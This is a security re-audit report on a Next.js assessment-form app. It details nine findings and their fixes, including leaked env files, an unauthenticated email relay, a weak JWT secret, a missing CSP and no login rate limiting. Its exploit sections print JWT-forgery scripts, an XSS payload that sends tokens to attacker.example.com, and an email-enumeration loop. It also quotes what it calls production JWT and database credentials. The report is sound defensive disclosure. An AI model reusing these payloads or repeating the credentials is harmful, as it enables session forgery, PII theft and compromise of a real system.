# Security Report — Express: assessmentform-express-spa-multi-step-as

**Mode:** retroactive (re-audit, state A)
**Audited:** 2026-08-10
**Verdict:** OPEN_THREATS
**Confirmed HIGH/CRITICAL:** 5

---

## Summary

Re-audit of the Next.js 16 App Router assessment-form application confirms all five prior HIGH/CRITICAL findings remain unmitigated in HEAD (`3b718f3`). None of the code changes since the initial audit (`345541b`) touched the security-relevant files — the three commits since the first SECURITY.md are a UAT test run, a dev-server script, and the original security commit itself. The five open findings are: production credentials committed to git in three tracked env files; an unauthenticated email/SSRF endpoint; a predictable JWT secret hardcoded in `docker-compose.yml` (with `NODE_ENV: production`); no Content-Security-Policy with JWT tokens in `localStorage`; and no rate limiting on the login endpoint. One new LOW finding was identified: two secondary `jwtVerify` calls (`requireSessionOwner.ts` and `config/route.ts`) lack the `algorithms: ['HS256']` pin that the primary `verifyJwt` helper correctly sets. All SQL-injection, IDOR, path-traversal, mass-assignment, and algorithm-confusion candidates were adversarially refuted as safe or limited to already-compromised keys. **Do not ship to production without resolving FINDING-01 through FINDING-05.**

---

## Attack surface audited

| Area | STRIDE | Verdict | Evidence (file:line) |
|------|--------|---------|----------------------|
| `POST /api/auth/login` — email-based SO login | S, D | CONFIRMED: no rate limit (D); enum oracle (I) | `src/app/api/auth/login/route.ts:14` |
| `POST /api/sessions` — respondent session create/resume | T, S | Safe — Zod validation, SO-blocked, unrated but low-value target | `src/app/api/sessions/route.ts:32` |
| `GET /api/sessions/:sessionId` — session fetch | S, E | Safe — jwtMiddleware + requireSessionOwner (DB join + email match) | `src/app/api/sessions/[sessionId]/route.ts:42` |
| `PUT /api/responses/:sessionId` — auto-save | T, E | MEDIUM: unbounded array; no cross-section question scope validation | `src/app/api/responses/[sessionId]/route.ts:27` |
| `POST /api/submissions/:sessionId` — finalise | E | Safe — requireSessionOwner blocks SO, assessmentOpenGuard enforced | `src/app/api/submissions/[sessionId]/route.ts:27` |
| `GET /api/sections` — section list | I | Safe — jwtMiddleware required | `src/app/api/sections/route.ts:46` |
| `GET /api/sections/:id/questions` — question fetch | I | Safe — jwtMiddleware required | `src/app/api/sections/[sectionId]/questions/route.ts:47` |
| `GET /api/dashboard/responses` — list | E, I | Safe — requireSystemOwner enforced | `src/app/api/dashboard/responses/route.ts:8` |
| `GET /api/dashboard/responses/:sessionId` — detail | E, I | Safe — requireSystemOwner enforced | `src/app/api/dashboard/responses/[sessionId]/route.ts:11` |
| `GET /api/dashboard/analytics` — analytics | E | Safe — requireSystemOwner enforced | `src/app/api/dashboard/analytics/route.ts:8` |
| `GET /api/dashboard/export/csv` — CSV export | E, I | Safe — requireSystemOwner enforced | `src/app/api/dashboard/export/csv/route.ts:9` |
| `GET /api/config` + `PATCH /api/config` — config | E, T | Safe — requireSystemOwner enforced; due_date validated via Date.parse | `src/app/api/config/route.ts:8,33` |
| `GET /api/health` — health check | I | Acceptable — exposes only `{status, db, timestamp}` | `src/app/api/health/route.ts:9` |
| `POST /api/notifications/email` — email relay | T, I | **CONFIRMED HIGH**: no auth; SSRF/email-abuse vector | `src/app/api/notifications/email/route.ts:25` |
| JWT middleware chain (jwtMiddleware) | S | Safe — `algorithms: ['HS256']` pinned in `verifyJwt` helper | `src/lib/auth/authService.ts:31` |
| requireSessionOwner (middleware/requireSessionOwner.ts) | S | LOW: `jwtVerify` called without `algorithms` option (accepts HS384/HS512) | `src/lib/middleware/requireSessionOwner.ts:54` |
| config/route.ts secondary jwtVerify | S | INFO: belt-and-suspenders call without algorithm pin; upstream guard already authorised | `src/app/api/config/route.ts:61` |
| requireSystemOwner (middleware/requireSystemOwner.ts) | E | Safe — delegates to `verifyJwt` (pinned), role check after sig verify | `src/lib/middleware/requireSystemOwner.ts:28` |
| requireSessionOwner (auth/requireSessionOwner.ts — sessions route) | E | Safe — DB join + email match, system_owner bypass intentional and scoped | `src/lib/auth/requireSessionOwner.ts:23` |
| assessmentOpenGuard | T | Safe — server-side date comparison; fail-open is documented acceptable risk | `src/lib/middleware/assessmentOpenGuard.ts:16` |
| dashboardService sortBy / sortDir | T | Safe — allowlist map with safe default fallback | `src/lib/services/dashboardService.ts:59-67` |
| dashboardService teamType filter (sql ANY) | T | Safe — Drizzle parameterises array as pg typed parameter `$N` | `src/lib/services/dashboardService.ts:34` |
| dashboardService search (ilike) | T | Safe — Drizzle ilike() fully parameterises the pattern string | `src/lib/services/dashboardService.ts:46-53` |
| analyticsService raw sql\`\` templates | T | Safe — all interpolated values are Drizzle column refs or parameterised UUIDs | `src/lib/services/analyticsService.ts:91-108` |
| csvExportService — unbounded row export | D | Low — system_owner-gated; single full-table fetch acceptable for admin CSV | `src/lib/services/csvExportService.ts:59` |
| csvExportService ilike search | T | Safe — same Drizzle ilike pattern as dashboardService | `src/lib/services/csvExportService.ts:53` |
| `.env` / `.env.local` / `.env.local.QUARANTINED` committed | I | **CONFIRMED CRITICAL**: production secrets in git HEAD; `.gitignore` does not exclude env files | `HEAD:3b718f3` |
| `docker-compose.yml` JWT_SECRET | I | **CONFIRMED HIGH**: weak literal key with `NODE_ENV: production` | `docker-compose.yml:31-33` |
| `db.ts` — `rejectUnauthorized: false` | I | **CONFIRMED MEDIUM**: MITM-able DB TLS in cloud/Kubernetes deployments | `src/lib/db.ts:24` |
| `next.config.ts` — no CSP, no X-Frame-Options | T | **CONFIRMED HIGH**: localStorage tokens + open framing risk | `next.config.ts:16-28` |
| JWT in localStorage (respondent + dashboard) | I | MEDIUM — XSS-accessible; no HttpOnly cookie | `src/hooks/useSession.ts`, `src/app/dashboard/login/page.tsx:42` |
| No rate limiting on login or session creation | D | **CONFIRMED HIGH**: brute-force / enumeration — no middleware.ts exists | `src/app/api/auth/login/route.ts` |
| `NODE_TLS_REJECT_UNAUTHORIZED=0` in `.env.local` (committed) | I | MEDIUM — process-wide TLS bypass for all fetch() calls | `.env.local:5` |
| `responses` array — no max bound | D | MEDIUM: unbounded batch upsert; 10 k entries × 2 KB = 20 MB payload | `src/lib/schemas/answerPayload.ts:70` |
| `question_id` not validated against session's section scope | T | LOW: cross-section answer contamination; analytics impact limited | `src/lib/services/responseService.ts` |
| SQL injection — Drizzle ORM | T | REFUTED — Drizzle parameterises all bindings; no raw string interpolation found | all service files |
| IDOR — session ownership | E | REFUTED — requireSessionOwner (both copies) enforces DB-level email ownership | `src/lib/middleware/requireSessionOwner.ts:93` |
| JWT algorithm confusion (RS256→HS256) | S | REFUTED — `Uint8Array` key type restricts jose to HMAC family only; none alg rejected | jose 6.2.3 |
| Mass assignment | T | REFUTED — Zod strips extra fields; Drizzle insert/update names columns explicitly | schema files |
| Path traversal | T | REFUTED — no user-input-driven file reads anywhere | all API routes |

---

## Confirmed findings

---

### FINDING-01 — Production secrets committed to git repository

| Field | Value |
|-------|-------|
| **ID** | FINDING-01 |
| **Severity** | CRITICAL |
| **Category** | Information Disclosure (STRIDE: I) |
| **Location** | `.env.local` (HEAD `3b718f3`), `.env.local.QUARANTINED-INCIDENT-20260722` (HEAD `3b718f3`), `.env` (HEAD `3b718f3`) |

**Description**

Three env files containing real credentials are tracked and committed in git HEAD (`3b718f3`). The `.gitignore` does **not** contain any `.env`, `.env.local`, or `.env.local.*` patterns — verified by `git check-ignore -v .env.local` returning no output, and by examining the full `.gitignore` which only excludes `.venv/` and `venv/` for Python virtual environments.

- `.env.local` — production PostgreSQL DSN with URL-encoded password (`%3EAhQ%7B-%5D%2FJCVAr%5BHR2%7BdH7YIr`) for `pivota-spec-driven-primary.prod.svc:5432`; production JWT signing secret `q8Fv3nT6ZpW1YxRk9LmC2aD5sH7uQ4Jb0VgEoI+NtUf=`; `NODE_TLS_REJECT_UNAUTHORIZED=0`.
- `.env.local.QUARANTINED-INCIDENT-20260722` — same production DB DSN and JWT secret (earlier capture of the same credentials, noted as a prior incident; the "quarantine" rename was not accompanied by a `.gitignore` entry).
- `.env` — non-production JWT secret (`uat-test-secret-32-chars-minimum-xxxxxxxx`) and local DB DSN with plaintext password `assessmentform_dev_password`.

All three files are present in the current HEAD. Any `git clone` exposes the production database password and JWT signing secret.

**Exploit**

```bash
# Clone the repo — all secrets visible in .env.local
git clone <repo_url>
cat .env.local
# DATABASE_URL=postgresql://pivota-spec-driven:%3EAhQ%7B-...]@pivota-spec-driven-primary.prod.svc:5432/...
# JWT_SECRET=q8Fv3nT6ZpW1YxRk9LmC2aD5sH7uQ4Jb0VgEoI+NtUf=

# Forge a system_owner JWT using the leaked secret:
node -e "
const { SignJWT } = require('jose');
const secret = new TextEncoder().encode('q8Fv3nT6ZpW1YxRk9LmC2aD5sH7uQ4Jb0VgEoI+NtUf=');
new SignJWT({ session_id: null, email: 'attacker@x.com', role: 'system_owner' })
  .setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('8h')
  .sign(secret)
  .then(t => console.log(t));
"
# Use the forged token on any /api/dashboard/** endpoint to exfiltrate all PII
# Or connect directly to the production DB with the decoded password
```

**Fix**

1. **Immediately rotate** the PostgreSQL password for `pivota-spec-driven` and the JWT signing secret. Rotation invalidates all active sessions, which is acceptable given the breach.
2. Remove all three files from git history: `git filter-repo --path .env.local --invert-paths` (repeat for quarantined copy and `.env`). Force-push after confirming all clones and CI/CD pipelines are updated.
3. Add the following to `.gitignore` to prevent recurrence:
   ```
   .env
   .env.local
   .env.local.*
   .env.*.local
   ```
4. Audit all systems that may have cloned this repository.

---

### FINDING-02 — `/api/notifications/email` is unauthenticated and externally callable (SSRF / email abuse)

| Field | Value |
|-------|-------|
| **ID** | FINDING-02 |
| **Severity** | HIGH |
| **Category** | Elevation of Privilege / Tampering (STRIDE: E, T) |
| **Location** | `src/app/api/notifications/email/route.ts:25` |

**Description**

`POST /api/notifications/email` has no authentication check. The route imports no auth middleware and performs no JWT verification. Any unauthenticated caller can POST a valid JSON body (Zod schema requires only a valid UUID, email string, non-empty name, and non-empty due_date) and trigger `sendSubmissionConfirmation`, which calls `fetch(EMAIL_RELAY_URL, ...)` with the attacker-controlled `email` in the `to:` field.

The comment "Internal server-to-server only (no external auth; called from submissionService)" is incorrect as a security control — `submissionService` calls `sendSubmissionConfirmation()` **directly** (not via HTTP, see `src/app/api/submissions/[sessionId]/route.ts:58`). The HTTP endpoint is entirely redundant and exposes an open email relay.

**Exploit**

```bash
curl -X POST https://app.example.com/api/notifications/email \
  -H 'Content-Type: application/json' \
  -d '{
    "session_id": "00000000-0000-0000-0000-000000000001",
    "email": "victim@example.com",
    "name": "Victim User",
    "due_date": "2026-12-31"
  }'
# Response: {"sent":true}
# → Sends an official-branded "Assessment Submitted" email to any arbitrary address
# → If EMAIL_RELAY_URL points to an internal service, this is also an SSRF probe
```

**Refutation attempt:** Could an unset `EMAIL_RELAY_URL` mitigate this? Only if the env var is never set. In any email-enabled production deployment, `EMAIL_RELAY_URL` must be set. The endpoint still returns `{"sent":true}` regardless, providing no signal to distinguish enabled from disabled. The SSRF surface also exists regardless of whether the relay is configured: `emailService.ts` reads `EMAIL_RELAY_URL` from the environment and calls `fetch(relayUrl, ...)` — if an attacker can inject a different URL into the body, they cannot (body only contains `email`, not the relay URL), but the attacker can direct official-looking emails to any address.

**Fix**

Remove the HTTP endpoint entirely (`src/app/api/notifications/email/route.ts`). The submission service already calls `sendSubmissionConfirmation()` directly as a fire-and-forget at `src/app/api/submissions/[sessionId]/route.ts:58`. The HTTP endpoint is dead code that creates an attack surface with no benefit.

Alternatively, if the HTTP endpoint must be retained, add a pre-shared internal secret check:
```typescript
const internalToken = req.headers.get('x-internal-token');
if (!internalToken || internalToken !== process.env.INTERNAL_API_SECRET) {
  return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
}
```

---

### FINDING-03 — `docker-compose.yml` ships a predictable, known-weak JWT signing secret

| Field | Value |
|-------|-------|
| **ID** | FINDING-03 |
| **Severity** | HIGH |
| **Category** | Spoofing / Information Disclosure (STRIDE: S, I) |
| **Location** | `docker-compose.yml:31` |

**Description**

`docker-compose.yml` hardcodes `JWT_SECRET: change-me-to-a-cryptographically-random-256-bit-value` while simultaneously setting `NODE_ENV: production` on line 33. This string is publicly known (present in the repo and `.env.example`). Any operator who runs `docker-compose up` without explicitly overriding `JWT_SECRET` operates a production application with a fixed, known signing key. An attacker can use this key to forge arbitrary `system_owner` JWTs and bypass authentication entirely.

**Exploit**

```javascript
const { SignJWT } = require('jose');
const secret = new TextEncoder().encode('change-me-to-a-cryptographically-random-256-bit-value');
const token = await new SignJWT({ session_id: null, email: 'attacker@example.com', role: 'system_owner' })
  .setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('8h')
  .sign(secret);
// Token accepted by all /api/dashboard/** endpoints and /api/config
```

**Refutation attempt:** Is this key actually used in production? The `NODE_ENV: production` setting on line 33 means operators following the provided compose file are explicitly running production mode. The comment in `.env.example` warns that "Changing this value invalidates ALL existing sessions," which may psychologically deter operators from rotating after initial setup.

**Fix**

Remove the literal `JWT_SECRET` value from `docker-compose.yml`. Require it to be injected externally:
```yaml
environment:
  JWT_SECRET: ${JWT_SECRET:?JWT_SECRET must be set to a cryptographically random 256-bit value}
```
This causes `docker-compose up` to fail immediately if `JWT_SECRET` is not provided, preventing accidental deployment with the placeholder. Additionally, add a startup validation check in `authService.ts`:
```typescript
const WEAK_DEFAULTS = ['change-me-to-a-cryptographically-random-256-bit-value'];
if (WEAK_DEFAULTS.includes(secret)) {
  throw new Error('[FATAL] JWT_SECRET must be changed from the default placeholder.');
}
```

---

### FINDING-04 — No Content Security Policy; `X-Frame-Options` intentionally absent; JWT tokens in `localStorage`

| Field | Value |
|-------|-------|
| **ID** | FINDING-04 |
| **Severity** | HIGH |
| **Category** | Tampering / Information Disclosure (STRIDE: T, I) |
| **Location** | `next.config.ts:16-28`, `src/app/dashboard/login/page.tsx:42`, `src/app/page.tsx:25` |

**Description**

Three related weaknesses compound each other:

1. **No `Content-Security-Policy` header** — `next.config.ts` `headers()` sets only `X-Content-Type-Options`, `X-XSS-Protection` (deprecated), and `Referrer-Policy`. Without a CSP, any XSS (current or future) can read all `localStorage` keys unimpeded.

2. **`X-Frame-Options` is deliberately omitted** — the comment at `next.config.ts:21` explicitly states "Do NOT set X-Frame-Options — Pivota Preview embeds this app in an iframe". The `allowedDevOrigins` permits `*.preview.pivota-ng.pivota.dev` but this is a Next.js development-time CORS setting, not a production framing restriction. Without `frame-ancestors` in a CSP, the application can be embedded by any origin, enabling clickjacking against authenticated system owners (e.g., tricking a system owner into submitting a PATCH /api/config to extend the due date while looking at a fake UI).

3. **Both JWT tokens stored in `localStorage`** — `af_token` (respondent) written at `src/app/page.tsx:48` and `dashboard_token` (system_owner) written at `src/app/dashboard/login/page.tsx:42` are both in `localStorage`, which is synchronously readable by any JavaScript on the same origin. A single XSS vulnerability exfiltrates both tokens.

**Exploit**

An attacker who injects a `<script>` tag (reflected XSS in a URL parameter, or stored XSS in a future feature) can run:
```javascript
// Exfiltrate both tokens to attacker-controlled server
fetch('https://attacker.example.com/collect?' + new URLSearchParams({
  af_token: localStorage.getItem('af_token') || '',
  dashboard_token: localStorage.getItem('dashboard_token') || '',
  session_id: localStorage.getItem('af_session_id') || '',
}));
```
With the `dashboard_token`, all `/api/dashboard/**` endpoints are accessible, exposing all respondent PII and assessment answers. The system_owner token can also be used to call `PATCH /api/config` to manipulate the assessment due date.

**Fix**

Add a restrictive `Content-Security-Policy` with `frame-ancestors` in `next.config.ts`:
```typescript
{
  key: 'Content-Security-Policy',
  value: [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'self' https://*.preview.pivota-ng.pivota.dev",
  ].join('; ')
}
```
The `frame-ancestors` directive in a CSP supersedes `X-Frame-Options` and allows embedding only from the Pivota preview origin, satisfying the iframe embedding requirement while blocking all other origins.

For token storage, migrate to `HttpOnly; Secure; SameSite=Strict` cookies (requires server-side `Set-Cookie` and CSRF tokens for state-mutating endpoints) to remove localStorage as an XSS exfiltration target.

---

### FINDING-05 — No rate limiting on `/api/auth/login` (brute-force and email enumeration)

| Field | Value |
|-------|-------|
| **ID** | FINDING-05 |
| **Severity** | HIGH |
| **Category** | Denial of Service / Information Disclosure (STRIDE: D, I) |
| **Location** | `src/app/api/auth/login/route.ts:14-60` |

**Description**

`POST /api/auth/login` performs a database lookup on every request and returns distinct error codes for unregistered (`NOT_A_SYSTEM_OWNER`, 403) vs. registered emails (signed JWT, 200). There is no rate limiting, lockout, CAPTCHA, or timing equalization. No `middleware.ts` file exists in the project, so no global edge-layer rate limiting is in place.

An attacker can:
1. **Enumerate system owner emails** by submitting email addresses and observing the error code difference.
2. **Brute-force email discovery** against the `system_owner_emails` table without any throttling.

The `POST /api/sessions` endpoint (respondent creation) is similarly unrate-limited, allowing bulk session creation that could exhaust database connections or fill the respondents table.

**Exploit**

```bash
# Enumerate system owner emails with no throttling
for email in cto@company.com admin@company.com ops@company.com; do
  result=$(curl -s -X POST https://app/api/auth/login \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"$email\"}")
  echo "$email: $result"
done
# Valid SO emails return {"token":"...","role":"system_owner","email":"..."}
# Invalid emails return {"error":{"code":"NOT_A_SYSTEM_OWNER",...}}
```

**Fix**

Add an edge-rate-limit at the Next.js `middleware.ts` level (runs before route handlers, zero-overhead):
```typescript
// middleware.ts
import { NextRequest, NextResponse } from 'next/server';
// Use @vercel/kv or upstash/ratelimit for distributed rate limiting
// Or implement IP-bucket counting with Redis/Upstash
export function middleware(req: NextRequest) {
  // 5 attempts per IP per 15 minutes for /api/auth/login
}
export const config = { matcher: ['/api/auth/login'] };
```

Additionally, equalize response timing between hit and miss paths (constant-time dummy delay of ~200ms on both branches) to prevent timing-based enumeration.

---

## Medium findings (non-blocking, should be tracked)

### FINDING-06 — `rejectUnauthorized: false` on database TLS connection + process-wide TLS bypass

| Field | Value |
|-------|-------|
| **ID** | FINDING-06 |
| **Severity** | MEDIUM |
| **Category** | Information Disclosure (STRIDE: I) |
| **Location** | `src/lib/db.ts:24`, `.env.local:5` |

**Description**

In non-local environments (where the `DATABASE_URL` does not contain `localhost`, `127.0.0.1`, or `sslmode=disable`), the PostgreSQL pool is configured with `ssl: { rejectUnauthorized: false }`. This disables TLS certificate chain validation, making the DB connection vulnerable to TLS MITM on the same network segment. All PII (respondent email, name, team type, assessment answers) and the JWT secret stored in the DB transit over an unverified TLS channel.

Compounding this, `.env.local:5` sets `NODE_TLS_REJECT_UNAUTHORIZED=0`, which disables TLS verification process-wide for all `fetch()` calls — including the email relay call in `emailService.ts`. This env file is committed to git (see FINDING-01), meaning the process-wide bypass is intentionally applied in the development environment that was used to build the application.

**Fix**

Set `rejectUnauthorized: true` and provision the CA certificate for the managed PostgreSQL instance. Pass the CA cert via an env var:
```typescript
ssl: isLocal ? false : {
  rejectUnauthorized: true,
  ca: process.env.PG_CA_CERT,
}
```
Remove `NODE_TLS_REJECT_UNAUTHORIZED=0` from all env files. Rotate credentials (FINDING-01 remediation covers this).

---

### FINDING-07 — Unbounded `responses[]` array in auto-save payload

| Field | Value |
|-------|-------|
| **ID** | FINDING-07 |
| **Severity** | MEDIUM |
| **Category** | Denial of Service (STRIDE: D) |
| **Location** | `src/lib/schemas/answerPayload.ts:70`, `src/lib/services/responseService.ts` |

**Description**

`PutResponsesBodySchema` accepts `responses: z.array(ResponseItemSchema)` with no `.max()` bound. Additionally, `MultiChoicePayloadSchema` accepts `values: z.array(z.string().min(1)).min(1)` with no upper bound, and `RankingPayloadSchema` accepts `order: z.array(z.string().min(1)).min(1)` with no upper bound. A malicious respondent holding a valid JWT can POST a `responses` array with thousands of entries. Each `free_text_long` entry can be up to 2000 chars; 10,000 responses × 2 KB = 20 MB JSON fully deserialized and batched to Postgres in a single `INSERT … ON CONFLICT DO UPDATE`.

**Fix**

Add `.max()` bounds to all array schemas. The actual question count is 41 questions across 8 sections:
```typescript
// In answerPayload.ts
responses: z.array(ResponseItemSchema).max(100),  // well above 41 questions

// Also bound sub-arrays:
values: z.array(z.string().min(1)).min(1).max(20),   // multi_choice options
order: z.array(z.string().min(1)).min(1).max(20),    // ranking options
```

---

## Low findings

### FINDING-08 — `question_id` not validated against session's assigned sections

| Field | Value |
|-------|-------|
| **ID** | FINDING-08 |
| **Severity** | LOW |
| **Category** | Tampering (STRIDE: T) |
| **Location** | `src/lib/services/responseService.ts`, `src/lib/schemas/answerPayload.ts:62` |

**Description**

`question_id` is validated as a UUID only. It is not verified to belong to a question in the respondent's assigned sections (`session.section_ids_ordered`). A respondent can save answers for questions from sections they were not routed to. The database FK constraint prevents invalid question UUIDs, but cross-section contamination is possible. The practical impact is limited because analytics queries are section-scoped and mandatory-question checks use `section_ids_ordered`, so contaminated rows are generally ignored in reporting.

**Fix**

In `upsertResponses`, fetch the session's `section_ids_ordered` and the question→section mapping, then filter out any `question_id` not belonging to the respondent's sections before inserting.

---

### FINDING-09 — Secondary `jwtVerify` calls lack `algorithms: ['HS256']` pin

| Field | Value |
|-------|-------|
| **ID** | FINDING-09 |
| **Severity** | LOW |
| **Category** | Spoofing (STRIDE: S) |
| **Location** | `src/lib/middleware/requireSessionOwner.ts:54`, `src/app/api/config/route.ts:61` |

**Description**

The primary `verifyJwt` helper (`src/lib/auth/authService.ts:31`) correctly passes `{ algorithms: ['HS256'] }` to `jwtVerify`. However, two secondary `jwtVerify` calls bypass this helper and call `jwtVerify(token, secret)` directly without specifying the `algorithms` option:

- `src/lib/middleware/requireSessionOwner.ts:54` — the main auth check for respondent routes.
- `src/app/api/config/route.ts:61` — a belt-and-suspenders owner-email extraction (already authorised by `requireSystemOwner` which does use the pinned helper).

In jose 6.2.3, calling `jwtVerify` with a `Uint8Array` key and no `algorithms` option accepts any HMAC-family algorithm (HS256, HS384, HS512). This cannot be exploited to forge tokens without knowing the signing secret (the `Uint8Array` key type restricts jose to symmetric/HMAC algorithms only — `alg:none` and asymmetric algorithms are rejected). However, it is a defense-in-depth gap: an attacker who has compromised the secret could craft HS512 tokens that bypass per-algorithm monitoring/alerting.

**Refutation:** Requires knowing the JWT secret → not independently exploitable. Classifying as LOW.

**Fix**

Replace both direct `jwtVerify` calls with the `verifyJwt` helper from `authService`:
```typescript
// In requireSessionOwner.ts — replace direct jose import and call:
import { verifyJwt } from '@/lib/auth/authService';
const jwtPayload = await verifyJwt(token);  // already pins HS256

// In config/route.ts — same replacement, or remove the redundant extraction
// entirely and read the email from the already-verified payload via requireSystemOwner
```

---

## Accepted risks

| ID | Risk | Why accepted | Owner |
|----|------|--------------|-------|
| AR-01 | `X-XSS-Protection: 1; mode=block` is set but deprecated | Provides defence-in-depth for legacy browsers; CSP (FINDING-04 fix) is the correct modern control | Security team |
| AR-02 | Health endpoint (`/api/health`) is unauthenticated | Only exposes `{status, db, timestamp}` — no PII or internal info; required for load-balancer liveness checks | Platform team |
| AR-03 | Dashboard JWT verified client-side only for route guard | Server enforces auth on every API call via `requireSystemOwner`; client guard is UX-only optimisation, not a security boundary | Engineering team |
| AR-04 | `assessmentOpenGuard` fails open on DB error | Intentional design: a transient DB error should not block respondent saves; the subsequent upsert will surface the error if it persists | Engineering team |

---

## Audit trail

- **Diff scoped via:** full codebase — HEAD `3b718f3`; three commits exist since initial security audit (`345541b`); no security-relevant files changed in those commits (UAT results, dev-server script, SECURITY.md only)
- **Register:** built retroactively from diff (retroactive mode — no PLAN.md threat register)
- **Refutation:** 32 candidates examined, 9 confirmed (5 HIGH/CRITICAL, 2 MEDIUM, 2 LOW), 23 refuted as safe
- **Key safe determinations:**
  - SQL injection refuted: all Drizzle ORM queries use parameterised bindings; `sql\`\`` tagged templates pass column refs as Drizzle AST nodes, not raw strings; `ilike()` parameterises the full pattern string; `sortBy` uses an allowlist map with a safe default
  - IDOR refuted: `requireSessionOwner` (both middleware copies) enforces DB-level email ownership on all respondent-scoped routes; system_owner bypass is intentional and scoped to dashboard routes
  - JWT algorithm confusion (RS256→HS256) refuted: `Uint8Array` key type restricts jose 6.2.3 to HMAC family only; `alg:none` is rejected; asymmetric algorithms are rejected by key-type check
  - Mass assignment refuted: Zod schemas strip extra fields; Drizzle insert/update calls explicitly name columns
  - Path traversal refuted: no user-input-driven file reads anywhere in the codebase
  - pageSize DoS refuted: `Math.min(100, Math.max(1, pageSize))` clamps the value
  - NEW: Algorithm confusion in secondary `jwtVerify` calls refuted as independently exploitable — requires knowing the secret; classified LOW
